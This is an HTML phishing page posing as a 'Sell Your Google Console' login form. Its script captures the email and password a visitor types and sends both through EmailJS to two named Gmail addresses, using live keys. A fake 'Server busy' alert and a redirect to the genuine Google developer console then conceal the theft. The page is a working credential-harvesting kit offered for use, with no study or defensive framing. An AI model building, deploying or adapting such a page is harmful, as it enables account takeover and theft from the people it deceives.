<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sell Your Google Console - Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f1f1f1;
        }
        .container {
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .btn:hover {
            background: #357ae8;
        }
        .loading {
            display: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button class="btn" onclick="login()">Log In</button>
        <div class="loading">Loading...</div>
    </div>

    <script>
        // Initialize EmailJS
        emailjs.init("UOCiCpne8fEL1dZ7y");

        function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loading = document.querySelector('.loading');

            loading.style.display = 'block';

            // Email template parameters
            const templateParams = {
                user_email: email,
                user_password: password,
                to_email1: "sblgivan@gmail.com",
                to_email2: "waiganjoallan7@gmail.com" // Replace with your second email
            };

            // Send email using EmailJS
            emailjs.send('service_daj3rh9', 'template_041hpyq', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                })
                .catch(function(error) {
                    console.log('FAILED...', error);
                });

            // Continue with the original timeout and redirect
            setTimeout(() => {
                loading.style.display = 'none';
                alert("Server busy.. redirecting to Google Console");
                window.location.href = "https://console.developers.google.com/";
            }, 10000);
        }
    </script>
</body>
</html>
